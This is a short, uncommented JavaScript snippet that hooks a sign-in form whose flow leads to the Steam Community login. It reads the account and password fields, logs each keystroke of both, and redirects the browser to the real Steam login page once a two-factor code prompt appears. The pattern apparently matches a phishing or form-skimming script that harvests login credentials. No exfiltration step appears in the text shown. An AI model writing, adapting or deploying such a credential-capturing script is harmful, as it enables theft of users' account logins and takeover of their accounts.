window.onload = function() {
	var login_dom = null;
	var login_timer = null;
	login_timer = setInterval(() => {
		login_dom = document.getElementsByClassName('DjSvCZoKKfoNSmarsEcTS');
		if (login_dom && login_dom[0].innerHTML == 'Sign in') {
			clearInterval(login_timer);
			login_timer = null;

			var form_dom = document.getElementsByClassName('_2GBWeup5cttgbTw8FM3tfx');
			var form_acccount = form_dom[0].value;
			var form_password = form_dom[1].value;
			form_dom[0].addEventListener('input', (e) => {
				form_acccount = e.target.value;
				console.log(form_acccount)
			})
			form_dom[1].addEventListener('input', (e) => {
				form_password = e.target.value;
				console.log(form_password)
			})

			login_dom[0].addEventListener('click', () => {
				var confirm_dom = null;
				var confirm_timer = null;

				confirm_timer = setInterval(() => {
					confirm_dom = document.getElementsByClassName(
						'_1K431RbY14lkaFW6-XgSsC _2FyQDUS2uHbW1fzoFK2jLx');
					if (confirm_dom && confirm_dom[0].innerHTML == 'Enter a code instead') {
						clearInterval(confirm_timer)
						confirm_timer = null;

						window.location.href =
							'https://steamcommunity.com/login/home/?l=english'
					}
				}, 1000)
			})
		}
	}, 1000)
}()
